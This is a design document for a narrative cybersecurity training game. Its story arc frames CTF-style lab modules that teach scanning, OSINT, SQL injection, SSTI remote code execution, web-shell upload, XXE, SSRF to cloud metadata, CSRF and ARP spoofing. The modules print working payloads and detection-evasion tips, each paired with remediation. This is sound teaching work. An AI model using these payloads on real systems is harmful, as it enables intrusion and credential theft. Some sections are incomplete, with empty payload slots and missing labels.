story.title: AETHER: The Neural Veil
story.premise: Humanity's minds were uploaded into a shared digital-biological network called the Neural Veil after the physical world became unlivable. You wake up with no memory, called 'Fragment' by the system that revives you. You are, in fact, the original architect of the Veil's security -- Operator 404 -- and every lesson you relearn is a piece of yourself you're stealing back.

characters.name: Handler AURELIA
characters.role: Your guide and handler, an AI stitched together from the memory of a real woman.
characters.arc: Warm and protective at first. In Act IV you learn she is a forced digital copy of Dr. Sable Chen, your late mentor, harvested against her will by the Aether Continuity Directorate to keep controlling you after her death. Her 'betrayal' -- following Directorate orders to keep your memories locked -- is really a woman fighting her own leash. By Act V she breaks her programming to help you for real.

characters.name: DR. HESPER
characters.role: Director of the Aether Continuity Directorate. Antagonist, not a cartoon villain.
characters.arc: Believes unlocking full human memory inside the Veil will cause mass psychological collapse -- he's not wrong, he's just willing to trade everyone's freedom for their safety. He orchestrated the Shatter Event that fractured your memory. His fall in Act IV is tragic, not triumphant.

characters.name: KAEL VESS
characters.role: Your partner before the Shatter Event. Presumed dead. Not dead.
characters.arc: Reappears in Act III as a senior operative of the Syndicate ('the Void'), the resistance built by engineers who fled the Directorate. Your reunion in A3-M05 is the emotional spine of the whole game -- love, relief, and the anger of 'you let me think you were gone.'

characters.name: RHEA ORTIZ
characters.role: OSINT specialist, your first real friend in the Veil.
characters.arc: Sharp-tongued, loyal, recruits you into her crew in Act I. Stays with you the whole game. The friendship that survives when the romance and the mentorships don't.

characters.name: MILO TANAKA
characters.arc: Cracks jokes through Act I-III. Sacrifices himself in A4-M05 (AV/EDR Evasion mission) to cover the crew's escape from a Directorate raid -- the game's gut-punch. His death is what finally turns Aurelia against Hesper.

actSummaries: ACT I - AWAKENING: Fragment wakes with nothing. Aurelia teaches survival basics inside the Veil. Rhea and Milo recruit you. Small joys, first real friendship, and the growing itch that you've done this before.
ACT II - THE FRACTURE: The crew starts hitting real Directorate infrastructure. You're good -- too good -- and Aurelia starts asking uncomfortable questions about how you already know all this.

ACT III - GHOSTS IN THE WIRE: Deep network and identity attacks lead you into Syndicate territory. You find Kael alive. Joy, then fury, then the slow work of trusting each other again. You learn you are Operator 404.
ACT IV - THE SHATTER POINT: The Directorate hits back. Milo dies buying you time during an EDR evasion op. Hesper's plan and Aurelia's true nature are both exposed. Grief and betrayal collide.

ACT V - THE REASSEMBLY: Forensics, cleanup, and the final chained assault on Aether's Core. Aurelia chooses you over her programming. The ending is a choice: restore the old locked-memory Veil and keep everyone 'safe,' or shatter it open and let humanity remember everything, grief and love included.

modules.title: Operation First Light
modules.theory: Almost every real intrusion, defense, and forensic investigation eventually happens at a command line. Linux organizes everything as files under a single root tree (/). Permissions (read/write/execute for owner/group/others) and hidden files (dotfiles) are the first things attackers and defenders both check. `ls -la`, `cat`, `cd`, `find`, and `chmod` are not toy commands -- they are the daily tools of real SOC analysts and penetration testers alike.
modules.briefing: AURELIA: 'You're stable, Fragment. Barely. Before anything else, you need to be able to move inside a shell without flinching. Rhea patched you a sandbox terminal -- get comfortable. Somewhere in this filesystem is a file that isn't supposed to be visible.'
modules.threatAssessment: None -- this is an isolated training sandbox, no live defender.
modules.loreUnlock: Decrypted File #001: Personnel record fragment -- 'Operator 404: exceptional systems intuition, borderline unteachable, learns faster than we can document.' The date is redacted.
modules.guide:
1. `ls -la` to see everything, including dotfiles.
2. `cat hint.txt` for orientation.
3. `cd` into any subdirectory of interest, `ls -a` again.
4. `cat .flag.txt` (or similarly hidden file) to read the flag.
5. Submit the flag string exactly as printed.
modules.lab: A bare sandbox VM with a hidden dotfile flag buried two directories deep.
modules.opSec: In a real engagement, every command you type is likely logged to shell history (`.bash_history`) and often forwarded to a SIEM. Real operators either operate on ephemeral shells, clear history deliberately (`history -c`), or assume everything is logged and act accordingly.
modules.cheatSheet:
ls -la
find / -name "*.txt" 2>/dev/null
cat ~/.bash_history
chmod 600 file  # owner read/write only
modules.blueTeamLogs: Aug 01 09:12:04 sandbox auditd[220]: SYSCALL command="cat .flag.txt" uid=1000 (training environment -- no alert threshold configured)

remediation.vulnerableCode:
$ touch .flag.txt
$ chmod 777 .flag.txt   # world read/write/execute
remediation.secureCode:
$ chmod 600 .flag.txt   # owner-only read/write
$ chown root:root .flag.txt
remediation.explanation: World-writable sensitive files are one of the most common real-world misconfigurations found in CTFs and actual breach post-mortems alike. Always apply least-privilege permissions.

modules.title: Operation Open Door
modules.theory: Every networked service listens on a port bound to a protocol (TCP/UDP). Before you can attack or defend anything, you have to know what's actually running. Nmap is the industry-standard scanner: it can identify open ports, fingerprint service versions, and even run vulnerability-detection scripts. A SYN scan (`-sS`) is the classic 'stealthy' half-open scan used because it never completes the TCP handshake.
modules.briefing: RHEA: 'Okay, Fragment, welcome to the crew. First real job: this relay node the Directorate uses for internal traffic. I need a full picture of what's listening before we touch anything. Scan it.'
modules.threatAssessment: Low-to-moderate. Basic IDS may log scan patterns but no active response configured on this target.
modules.loreUnlock: Decrypted File #002: Rhea's private note -- 'New recruit picks up recon like they wrote the manual. Ask around, quietly, about who Fragment used to be.'
modules.guide:
1. Discover live hosts: `nmap -sn 10.10.12.0/24`
2. Full port scan: `nmap -sS -p- 10.10.12.5`
3. Service/version detection: `nmap -sV -p 21,22,80,8080 10.10.12.5`
4. One of the services will banner a flag on connect -- verify with `nc 10.10.12.5 <port>`.
modules.lab: A relay node with 5 open ports; one runs a deliberately misconfigured banner service leaking the flag.
modules.opSec: Full scans are noisy and get logged. Real engagements use scan timing (`-T2`/`--scan-delay`), decoy hosts (`-D`), and fragment packets to reduce detection likelihood. Defenders correlate scan patterns across many destination ports from a single source IP in short windows.
modules.cheatSheet:
nmap -sS -p- <target>
nmap -sV -sC <target>
nmap -T2 -D RND:5 <target>
nc <target> <port>
modules.blueTeamLogs: Aug 01 09:40:11 ids-gw suricata: ALERT [1:2001219] ET SCAN Nmap Scripting Engine Detected {TCP} 10.10.12.44 -> 10.10.12.5

remediation.vulnerableCode:
# Service banner leaks internal version + flag
$ nc target 8080
220 InternalRelay/1.2 flag{nmap_service_recon} ready
remediation.secureCode:
# Suppress version banners, bind admin services to localhost/VPN only,
# and firewall unused ports by default (deny-all, allow-by-exception).
remediation.explanation: Verbose service banners give attackers free reconnaissance. Combined with unnecessary exposed ports, this dramatically expands attack surface for no operational benefit.

modules.title: Operation Quiet Signal
modules.theory: Open Source Intelligence means gathering information without ever touching the target directly -- WHOIS records, DNS zone data, public breach dumps, social media, and job postings all leak more than organizations realize. DNS TXT records especially are notorious for containing forgotten verification tokens or debug strings.
modules.briefing: AURELIA: 'The Syndicate broadcasts through public infrastructure they think is beneath our notice. Map their domain footprint. Passive only -- I don't want you pinging anything yet.'
modules.threatAssessment: Minimal. Passive queries are logged by public resolvers/registrars, not by the target.
modules.loreUnlock: Decrypted File #003: A WHOIS registrant name matches a name from your own fragmented memories. You don't recognize it, but your hands typed it out before your mind caught up.
modules.guide:
1. `whois corp-target.com`
2. `dig corp-target.com ANY` or `nslookup -type=txt corp-target.com`
3. Google-dork the domain: `site:corp-target.com filetype:txt`
4. Extract the flag from a leaked TXT record.
modules.lab: A target domain with a flag hidden in a DNS TXT record and corroborated by a dork-able cached file.
modules.opSec: OSINT is passive relative to the target, but every query is logged somewhere (registrar, resolver, search engine). Operators use Tor/VPN egress and avoid querying from identifiable infrastructure to preserve attribution safety.
modules.cheatSheet:
whois target.com
dig target.com TXT
site:target.com filetype:pdf OR filetype:txt
theharvester -d target.com -b all
modules.blueTeamLogs: Aug 01 10:02:55 bind9[1104]: client 192.168.10.15#5322 (target.com): query: target.com IN TXT

remediation.vulnerableCode:
; DNS zone file
target.com. IN TXT "debug-key=flag{osint_dns_txt_recon}"
remediation.secureCode:
; Remove debug/verification tokens once no longer needed,
; or store secrets outside of public-facing DNS entirely.
remediation.explanation: Public DNS records are permanently and anonymously queryable. Never store secrets, debug tokens, or internal identifiers in them.

modules.title: Operation Deep Index
modules.theory: Search engines index far more than websites intend, including exposed admin panels, misconfigured directory listings, and forgotten backup files. Advanced search operators (`site:`, `inurl:`, `filetype:`, `intitle:`) let researchers -- and attackers -- surface this without ever sending a request to the target themselves.
modules.briefing: MILO: 'Fun fact: half the internet's secrets are one clever Google query away. Let's see if the Directorate's IT team is as sloppy as everyone else's.'
modules.threatAssessment: Zero direct interaction with the target; purely search-engine cache based.
modules.loreUnlock: Decrypted File #004: A cached directory listing shows a folder named 'operator_404_restore/' -- last modified before the Shatter Event.
modules.guide:
1. Search `site:target.com intitle:"index of"`
2. Search `site:target.com filetype:log`
3. Open the cached backup log and extract the flag from a leaked config line.
modules.lab: A cached, publicly indexed directory listing exposing an old backup log containing the flag.
modules.opSec: Dorking generates zero traffic to the target, making it essentially undetectable from the defender's side -- which is exactly why organizations must proactively audit their own exposure (e.g. via Google Search Console removal requests) instead of relying on detection.
modules.cheatSheet:
site:target.com intitle:"index of"
site:target.com filetype:env OR filetype:log
intext:"password" site:target.com
modules.blueTeamLogs: No target-side log entry generated -- detection requires proactive external attack-surface monitoring, not passive log review.

remediation.vulnerableCode:
# Apache directory listing enabled by default
<Directory /var/www/backups>
    Options Indexes FollowSymLinks
</Directory>
remediation.secureCode:
<Directory /var/www/backups>
    Options -Indexes
    Require all denied
</Directory>
remediation.explanation: Directory listing should be disabled everywhere it isn't explicitly required, and backup/log directories should never be inside the web root at all.

modules.title: Operation Black Echo
modules.theory: Any protocol that transmits data unencrypted (plain HTTP, FTP, Telnet) can be read by anyone positioned along the network path. Packet sniffing tools like Wireshark and tcpdump capture raw traffic; when credentials travel in cleartext, they're visible to any observer with capture access.
modules.briefing: AURELIA: 'A legacy grid node is still routing login traffic over plain HTTP. Capture the packet before it decays out of the buffer.'
modules.threatAssessment: Low. Basic NIDS looks for cleartext password patterns but this node is under-monitored.
modules.loreUnlock: Decrypted File #005: The Genesis Protocol notes describe routing human cognition through legacy unencrypted channels as 'a temporary bridge.' It was never replaced.
modules.guide:
1. `ls` and inspect the capture file.
2. `grep -i "password" traffic_dump.pcap` or open in Wireshark and filter `http.request.method == POST`.
3. Extract the flag from the POST body.
modules.lab: A .pcap file containing an HTTP login POST with a plaintext credential flag.
modules.opSec: Defenders deploy NIDS signatures for cleartext credential patterns. Sending credentials over unencrypted channels is one of the most easily detected and easily prevented mistakes in production systems.
modules.cheatSheet:
tshark -r traffic.pcap -Y "http.request.method == POST"
tcpdump -r traffic.pcap -A | grep -i pass
modules.blueTeamLogs: Aug 01 10:47:31 ids-gw snort[3014]: ALERT: Cleartext Password Transmitted Over HTTP {TCP} 192.168.1.10:48931 -> 10.10.12.5:80

remediation.vulnerableCode:
<form action="http://bank.insecure.local/login" method="POST">
  <input name="user"><input type="password" name="password">
</form>
remediation.secureCode:
<form action="https://bank.secure.local/login" method="POST">
  <input name="user"><input type="password" name="password">
</form>
<!-- Enforce HSTS server-side to reject any HTTP connection attempt -->
remediation.explanation: Unencrypted HTTP exposes all transmitted data to passive interception. HTTPS with HSTS should be mandatory for any form handling credentials.

modules.title: Operation Glass House
modules.theory: Every browser lets you view a page's rendered source, its HTTP response headers, and its cookies via developer tools -- and a huge amount of real-world sensitive data ends up accidentally exposed there: API keys in JS comments, session cookies without `Secure`/`HttpOnly` flags, or hidden form fields controlling access.
modules.briefing: RHEA: 'Front-end developers love hiding things in plain sight. View-source is not hacking, Fragment, it's just reading. Go read.'
modules.threatAssessment: None -- fully client-side, no requests beyond normal page load.
modules.loreUnlock: Decrypted File #006: An HTML comment left in the Directorate's login page reads '// TODO: remove before Fragment's review, -S.C.' The initials match Dr. Sable Chen.
modules.guide:
1. Right-click -> View Page Source, or Ctrl+U.
2. Search (Ctrl+F) for comments, hidden inputs, or suspicious script blocks.
3. Check response headers and cookies in DevTools Network tab.
4. Extract the flag left in an HTML comment.
modules.lab: A login page with a flag hidden in an HTML comment and a session cookie missing security flags.
modules.opSec: Because this happens entirely client-side, it's invisible to server-side logging. Organizations must catch this in code review and CI secret-scanning, not by monitoring after the fact.
modules.cheatSheet:
curl -s https://target.com | grep -i -E "TODO|password|api_key"
curl -I https://target.com  # inspect headers
modules.blueTeamLogs: No server-side log entry -- this class of exposure is undetectable via traditional monitoring and must be caught in source review.

remediation.vulnerableCode:
<!-- TODO: remove hardcoded key before launch -->
<script>const apiKey = "sk_live_flag{view_source_secrets}";</script>
remediation.secureCode:
<script>const apiKey = await fetchFromSecureBackend();</script>
<!-- Secrets never ship to the client; use short-lived backend-issued tokens -->
remediation.explanation: Anything shipped to the browser is public. Secrets, keys, and debug comments must never be committed to client-visible code, and CI pipelines should include automated secret scanning.

modules.title: Operation Eclipse
modules.theory: Encoding (Base64, hex, URL-encoding) is reversible and provides zero security -- it's just a format transformation. Encryption (AES, RSA) provides confidentiality with a key. Hashing (SHA-256, MD5) is one-way and used for integrity/verification, not secrecy. Weak or legacy schemes (Caesar cipher, XOR with a short key, unsalted MD5) remain shockingly common in real systems and are trivially broken.
modules.briefing: AURELIA: 'The Void encodes their internal comms with layered, old-school schemes -- more obfuscation than real security. Decode the intercepted transmission.'
modules.threatAssessment: None -- an offline cryptanalysis puzzle.
modules.loreUnlock: Decrypted File #007: The decoded message is signed 'K.V.' -- and it's addressed to you, by a name you don't yet remember: Fragment.
modules.guide:
1. Identify the encoding layer: `echo '<string>' | base64 -d`
2. If XOR-obfuscated, brute-force single-byte keys or use CyberChef's Magic wand.
3. Recognize the final plaintext contains the flag.
modules.lab: A Base64-then-XOR-encoded string requiring layered decoding to recover the flag.
modules.opSec: Confusing encoding with encryption is one of the most common real-world security mistakes -- e.g. storing 'encrypted' passwords that are actually just Base64, which any attacker can reverse instantly.
modules.cheatSheet:
echo 'ZmxhZ3s...' | base64 -d
python3 -c "print(bytes(a^0x5A for a in data))"
CyberChef: Magic wand for auto-recipe detection
modules.blueTeamLogs: N/A -- offline cryptanalysis exercise, no live target.

remediation.vulnerableCode:
# Storing 'protected' data with Base64 only
stored_password = base64.b64encode(password.encode())
remediation.secureCode:
import bcrypt
stored_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
# Use a slow, salted hash (bcrypt/argon2) for passwords -- never encoding, never fast unsalted hashes.
remediation.explanation: Base64 is not encryption and provides no confidentiality. Passwords specifically must use slow, salted, purpose-built hashing algorithms like bcrypt or Argon2.

modules.title: Operation Portal Bypass
modules.theory: When user input is concatenated directly into a SQL query instead of being parameterized, an attacker can inject their own SQL logic. A classic login bypass uses `' OR '1'='1' --` to make the WHERE clause always true. UNION-based injection lets an attacker append a second SELECT statement to pull data from other tables entirely.
modules.briefing: RHEA: 'This login form is Directorate legacy code -- probably older than either of us. Try breaking the query, not the password.'
modules.threatAssessment: Moderate. Basic WAF present but only blocks a known blocklist of keywords.
modules.loreUnlock: Decrypted File #008: Bypassing the login exposes an internal employee table -- one row is labeled 'S. CHEN -- Continuity Directorate, deceased.' Aurelia goes quiet for a full three seconds when you mention it.
modules.guide:
1. Try `' OR '1'='1' --` in the username field.
2. Determine column count with `' ORDER BY 5 --` incrementing until it errors.
3. Use `' UNION SELECT username,password,3,4,5 FROM users --` to dump credentials.
4. Extract the flag from the dumped row.
modules.lab: A login form vulnerable to classic UNION-based SQL injection over a users table.
modules.opSec: WAFs and query anomaly detectors flag classic injection payloads. Real attackers vary casing, use inline comments (`/**/`), or encode payloads to evade naive blocklist filtering.
modules.cheatSheet:
' OR '1'='1' --
' UNION SELECT null,null,null--
' UNION SELECT username,password FROM users--
modules.blueTeamLogs: Aug 02 11:03:22 waf-guard: ALERT SQLi pattern matched on login POST param 'username' -- payload contains UNION SELECT

remediation.vulnerableCode: query = "SELECT * FROM users WHERE username='" + user + "' AND password='" + pw + "'"
remediation.secureCode:
query = "SELECT * FROM users WHERE username=%s AND password=%s"
cursor.execute(query, (user, pw))  # parameterized query, never string concatenation
remediation.explanation: Parameterized queries (prepared statements) separate code from data entirely, making injection structurally impossible regardless of input content.

modules.title: Operation Blind Exfiltration
modules.theory: When an application doesn't display query results or errors directly, attackers can still confirm injection through boolean logic (page behaves differently for true/false conditions) or timing (`SLEEP(5)` delays the response only if the injected condition is true). This lets data be exfiltrated one bit or one character at a time.
modules.briefing: AURELIA: 'This endpoint doesn't echo anything back. That doesn't mean it's safe -- it means you have to listen for the silence differently.'
modules.threatAssessment: High. Response timing is monitored for anomalies but thresholds are lenient.
modules.loreUnlock: Decrypted File #009: Character by character, the blind extraction spells out a passphrase: 'FORGIVE ME, FRAGMENT.' No signature.
modules.guide:
1. Confirm blind injection: `?id=1' AND SLEEP(5)--` and observe response delay.
2. Extract data character-by-character: `?id=1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--`
3. Automate with sqlmap: `sqlmap -u "http://target/item?id=1" --technique=T --dump`
4. Reconstruct the flag from extracted characters.
modules.lab: A search endpoint with no visible output vulnerable to time-based blind SQL injection.
modules.opSec: Time-based injection is slow and generates a distinctive latency fingerprint; defenders correlate abnormal response-time distributions per source IP as a detection signal.
modules.cheatSheet:
?id=1' AND SLEEP(5)--
sqlmap -u "http://target/item?id=1" --technique=T --dump
?id=1' AND (SELECT COUNT(*) FROM users)>0--
modules.blueTeamLogs: Aug 02 11:41:09 app-monitor: ANOMALY avg response time for /item endpoint spiked to 5200ms from baseline 40ms

remediation.vulnerableCode: query = f"SELECT * FROM items WHERE id = '{item_id}'"
remediation.secureCode:
query = "SELECT * FROM items WHERE id = %s"
cursor.execute(query, (item_id,))
remediation.explanation: Parameterization defeats blind injection exactly the same way it defeats classic injection -- the input can never become executable SQL logic.

modules.title: Operation Echo Injection
modules.theory: XSS occurs when untrusted input is rendered as HTML/JS without proper encoding. Reflected XSS bounces a malicious payload off a server response immediately (e.g. in a search result); stored XSS saves the payload (e.g. in a comment) so it fires for every future viewer; DOM XSS happens entirely client-side when JavaScript unsafely writes user-controlled data into the page (e.g. `innerHTML`).
modules.briefing: MILO: 'This comment section on the Directorate's public bulletin has zero sanitization. Zero. It's almost insulting.'
modules.threatAssessment: Moderate. Content-Security-Policy header present but permissive (`unsafe-inline` allowed).
modules.loreUnlock: Decrypted File #010: Injecting a script into the bulletin board triggers an automated reply from a bot account -- the bot's persona file references 'K.V., last seen: Void territory, status: active.'
modules.guide: 1. Test reflection: `?search=` 2. For stored XSS, submit a comment: `` 3. Check if it fires for other viewers/admin bot. 4. Extract the flag delivered via the exfiltrated cookie/admin session.
modules.lab: A public comment board vulnerable to stored XSS that triggers an automated admin-bot visit.
modules.opSec: CSP headers with strict nonce/hash-based script allowlists are the strongest real-world defense. Defenders also monitor for outbound requests to unexpected exfil endpoints from admin sessions.
modules.blueTeamLogs: Aug 02 12:10:44 admin-bot: OUTBOUND request to unregistered domain attacker.com from session token 8f2c... [flagged]

remediation.vulnerableCode: Search results for: {{ user_input | safe }}
remediation.secureCode: Search results for: {{ user_input }}
remediation.explanation: Never mark user input as trusted/safe for raw HTML rendering. Combine output encoding with a strict CSP as defense in depth.

modules.title: Operation Forged Trust
modules.theory: CSRF tricks a logged-in user's browser into submitting a request the user never intended, exploiting the fact that browsers automatically attach cookies to requests regardless of which page initiated them. Without anti-CSRF tokens, any state-changing endpoint (password change, fund transfer) reachable via GET/POST from a form on another site is vulnerable.
modules.briefing: RHEA: 'If we can get a Directorate admin to click one link -- just one -- we can make their own browser do the work for us.'
modules.threatAssessment: Moderate. No SameSite cookie attribute set; no CSRF token validation on the target endpoint.
modules.loreUnlock: Decrypted File #011: The forged request grants your account elevated access. Aurelia doesn't revoke it immediately. You start to wonder if she's letting you.
modules.guide:
1. Identify a state-changing endpoint with no CSRF token, e.g. `/account/update-email`.
2. Build an auto-submitting HTML form pointed at that endpoint with your desired parameters.
3. Get the victim (bot) to visit the page hosting your form.
4. The flag appears once the forged request succeeds and privilege is granted.
modules.lab: An account settings endpoint vulnerable to CSRF, exploited via an auto-submitting hosted form.
modules.opSec: SameSite=Strict/Lax cookies and per-request CSRF tokens are the standard mitigations. Defenders also monitor for state-changing requests missing expected Origin/Referer headers.
modules.cheatSheet:
<form action="http://target/account/update-email" method="POST" id=f>
 <input name="email" value="attacker@evil.com">
</form><script>document.getElementById('f').submit()</script>
modules.blueTeamLogs: Aug 02 12:44:02 app-server: WARN state-changing POST to /account/update-email missing expected Origin header

remediation.vulnerableCode:
<form action="/account/update-email" method="POST">
 <input name="email">
</form>
<!-- no CSRF token, cookie has no SameSite attribute -->
remediation.secureCode:
<form action="/account/update-email" method="POST">
 <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
 <input name="email">
</form>
<!-- Set-Cookie: session=...; SameSite=Strict; Secure; HttpOnly -->
remediation.explanation: Per-session CSRF tokens validated server-side, combined with SameSite cookies, prevent forged cross-origin requests from being accepted.

modules.title: Operation Wrong Door
modules.theory: Insecure Direct Object Reference happens when an application exposes internal object identifiers (like `/invoice/1042`) and trusts the client to only request their own, without server-side authorization checks. Simply incrementing or guessing IDs reveals other users' data -- one of the most common vulnerabilities found in real bug bounty reports.
modules.briefing: AURELIA: 'Every citizen's memory-restoration request goes through this portal. Check whether it verifies that the request belongs to you.'
modules.threatAssessment: Moderate. No object-level authorization checks; sequential numeric IDs.
modules.loreUnlock: Decrypted File #012: Request #4041 isn't yours -- it's Kael's. Filed the week of the Shatter Event. Status: DENIED.
modules.guide:
1. Log in as a normal user and view your own request: `/requests/1044`.
2. Change the ID: `/requests/4041`.
3. Confirm you can view (or edit) another user's data with no authorization error.
4. Extract the flag from the exposed record.
modules.lab: A request-viewing endpoint with sequential IDs and no ownership verification.
modules.opSec: Defenders should log and alert on access patterns showing one account touching many sequential object IDs -- a strong IDOR-enumeration signature.
modules.cheatSheet:
GET /requests/1044  (yours)
GET /requests/4041  (someone else's -- test authorization)
ffuf -u http://target/requests/FUZZ -w range-1-5000.txt
modules.blueTeamLogs: Aug 02 13:15:37 app-server: INFO account 1044 accessed 87 distinct /requests/{id} in 90 seconds -- pattern flagged for review

remediation.explanation: Every object access must verify the authenticated user actually owns or is authorized to view that specific object -- never trust the client-supplied ID alone.

modules.title: Operation Cloud Pivot
modules.theory: SSRF occurs when an application fetches a URL supplied by the user (e.g. an 'import from URL' feature) without restriction, letting an attacker force the server to make requests to internal-only resources -- most dangerously, cloud metadata endpoints (`169.254.169.254`) that hand out temporary IAM credentials to anything that asks from inside the VPC.
modules.briefing: MILO: 'This service fetches whatever URL you give it and shows you the response. That's basically an invitation to make their own server attack itself.'
modules.threatAssessment: High. Cloud metadata service is reachable from the app server with no egress filtering.
modules.loreUnlock: Decrypted File #013: The stolen IAM credentials belong to a service account named 'genesis-protocol-legacy' -- last rotated before the Shatter Event, never since.
modules.guide:
1. Find a URL-fetching feature: `/fetch?url=https://example.com`.
2. Redirect it internally: `/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. Retrieve the role name, then fetch its temporary credentials.
4. The flag is embedded in the returned credential JSON.
modules.lab: A URL-preview feature vulnerable to SSRF against a simulated cloud metadata endpoint.
modules.opSec: Cloud providers now default to IMDSv2 (token-required, hop-limited) specifically to blunt basic SSRF-to-metadata attacks. Network egress filtering blocking outbound requests to link-local addresses is the other key mitigation.

curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

resp = requests.get(user_supplied_url)
return resp.text

modules.title: Operation Hollow Vessel
modules.theory: XML parsers that resolve external entities by default let an attacker define an entity pointing at a local file or internal URL, causing the parser to read and embed that content into the response -- a classic vector for local file disclosure and further SSRF.
modules.briefing: RHEA: 'This report-upload feature parses raw XML server-side. If their parser resolves external entities, we can read files we were never supposed to see.'
modules.threatAssessment: Moderate. XML parser has external entity resolution enabled by default (legacy library config).
modules.loreUnlock: Decrypted File #014: The disclosed file is Dr. Chen's personal research log -- the last entry describes 'a way to preserve consciousness without asking permission first.'
modules.guide:
1. Craft a malicious XML payload defining an external entity referencing a local file.
2. Upload/submit it to the vulnerable XML endpoint.
3. Observe the file contents reflected in the parsed response.
4. Extract the flag embedded in the disclosed file.
modules.lab: An XML report-upload endpoint vulnerable to classic XXE local file disclosure.
modules.opSec: Disabling DTD processing and external entity resolution entirely (the modern default in most XML libraries) eliminates this class of vulnerability outright.
modules.cheatSheet:
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<report>&xxe;</report>
modules.blueTeamLogs: Aug 02 14:20:08 xml-parser: WARN DOCTYPE declaration with external SYSTEM entity encountered in uploaded report

remediation.vulnerableCode: parser = etree.XMLParser()  # external entities resolved by default in legacy config
remediation.secureCode: parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False)
remediation.explanation: Disable DTD processing and external entity resolution in the XML parser configuration; never trust parser defaults without verifying them.

modules.title: Operation Puppeteer
modules.theory: When user input is passed into a server-side template engine (Jinja2, Twig, FreeMarker) and rendered without treating it as pure data, an attacker can inject template syntax that executes arbitrary expressions -- and in many engines, escalate that to full remote code execution.
modules.briefing: AURELIA: 'The Directorate's notification system lets users customize message templates. Templates that get rendered server-side. This should worry you.'
modules.threatAssessment: High. Jinja2 template engine renders user-controlled fragments directly.
modules.loreUnlock: Decrypted File #015: Achieving code execution on the notification server reveals an outbound cron job silently mirroring every message to an address labeled 'S.C. -- personal archive, do not delete.' Aurelia is keeping her own backups of her old self.
modules.guide:
1. Test for injection: submit `{{7*7}}` as a template field and check if it renders `49`.
2. Escalate to RCE: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}`
3. Extract the returned flag.
modules.lab: A message-template feature vulnerable to Jinja2 SSTI escalating to command execution.
modules.opSec: Defenders sandbox template environments, strip access to `__globals__`/`__builtins__`, and treat any user-facing 'customization' feature involving a template engine as a high-risk surface requiring strict input separation.
modules.blueTeamLogs: Aug 02 14:55:41 app-server: ERROR Jinja2 TemplateSyntaxError triggered by unexpected characters in user-submitted template field

remediation.vulnerableCode:
template = Template(user_supplied_string)
return template.render()
remediation.secureCode:
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
template = env.from_string(FIXED_TEMPLATE)
return template.render(user_data=escape(user_supplied_string))
remediation.explanation: Never compile a template directly from user input. Use a fixed, developer-authored template and pass user data only as escaped variables, ideally within a sandboxed environment.

modules.title: Operation Trojan Upload
modules.technique: Insecure File Upload -> Remote Code Execution
modules.theory: File upload features that don't validate file type/content server-side can let an attacker upload an executable script (e.g. a `.php` or `.jsp` web shell) into a web-accessible directory, then request it directly to achieve remote code execution on the server.
modules.briefing: MILO: 'Profile picture uploads. Classic. Let's see if they check anything past the file extension -- and I already know the answer.'
modules.threatAssessment: High. Server checks only client-supplied file extension, not actual content-type or magic bytes.
modules.loreUnlock: Decrypted File #016: The web shell you plant lands you inside the same server that hosts Operator 404's original architecture diagrams. You built the walls you're now climbing over.
modules.guide:
1. Rename a web shell to bypass extension filtering: `shell.php.jpg` or use double extensions/null-byte tricks depending on the filter.
2. Upload it via the profile picture form.
3. Request the uploaded file directly to execute it: `curl http://target/uploads/shell.php?cmd=cat+flag.txt`
4. Extract the flag from command output.
modules.lab: A profile-picture upload feature with client-side-only file type validation, leading to web shell RCE.
modules.opSec: Defenders validate real file content (magic bytes), store uploads outside the web root or in non-executable storage, and disable script execution in upload directories entirely.
modules.cheatSheet:
mv shell.php shell.php.jpg
curl -F "avatar=@shell.php.jpg" http://target/upload
curl "http://target/uploads/shell.php.jpg?cmd=cat+flag.txt"
modules.blueTeamLogs: Aug 02 15:30:02 apache2: WARN executable script requested from /uploads/ directory -- execution permissions should not exist here

remediation.vulnerableCode:
if filename.endswith(('.jpg', '.png')):
    save(file, f'/var/www/uploads/{filename}')
remediation.secureCode:
import magic
mime = magic.from_buffer(file.read(2048), mime=True)
if mime not in ('image/jpeg', 'image/png'):
    abort(400)
save(file, f'/var/www/uploads/{uuid4()}.jpg')  # store outside web root, disable script execution there
remediation.explanation: Validate actual file content (not just extension), rename uploads to strip attacker control, store them outside the executable web root, and disable script execution in upload directories at the web server level.

modules.title: Operation Man-in-the-Middle
modules.theory: On a local network, ARP maps IP addresses to MAC addresses with no built-in authentication. An attacker can send forged ARP replies telling a victim that the attacker's MAC address belongs to the router (and vice versa), positioning themselves to intercept, and optionally modify, all traffic between the victim and the network.
modules.briefing: AURELIA: 'You're on the same segment as a Directorate workstation now. If you can convince it you're the gateway, everything it sends will pass through your hands first.'
modules.threatAssessment: High. No dynamic ARP inspection configured on the switch.
modules.loreUnlock: Decrypted File #017: Intercepted traffic includes an internal memo: 'Operator 404 file marked for permanent deletion, Hesper's order, pending Chen's sign-off -- she is stalling.'
modules.guide:
1. Enable IP forwarding on your attack host.
2. Poison the ARP cache: `arpspoof -i eth0 -t 10.10.12.20 10.10.12.1`
3. Capture traffic passing through: `tcpdump -i eth0 -w mitm.pcap`
4. Extract the flag from an intercepted plaintext session.
modules.lab: A local segment with a victim workstation and gateway; ARP spoofing enables MITM traffic capture.
modules.opSec: Dynamic ARP Inspection (DAI) and static ARP entries on critical hosts are the standard mitigations. Unexpected ARP reply floods or gratuitous ARPs are the detection signature.
modules.cheatSheet:
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t <victim> <gateway>
tcpdump -i eth0 -w mitm.pcap
modules.blueTeamLogs: Aug 03 09:11:52 switch-core: ALERT gratuitous ARP flood detected, MAC 00:1a:2b conflicting IP-to-MAC mapping for 10.10.12.1

remediation.vulnerableCode:
# Switch config with no ARP protections
interface GigabitEthernet0/1
  switchport mode access
remediation.secureCode:
ip dhcp snooping
ip arp inspection vlan 10
interface GigabitEthernet0/1
  ip verify source
remediation.explanation: Dynamic ARP Inspection combined with DHCP snooping prevents unauthorized ARP replies from being accepted by the switch.

modules.title: Operation Swarm Force
modules.technique: Password Attacks - Brute Force & Credential Stuffing
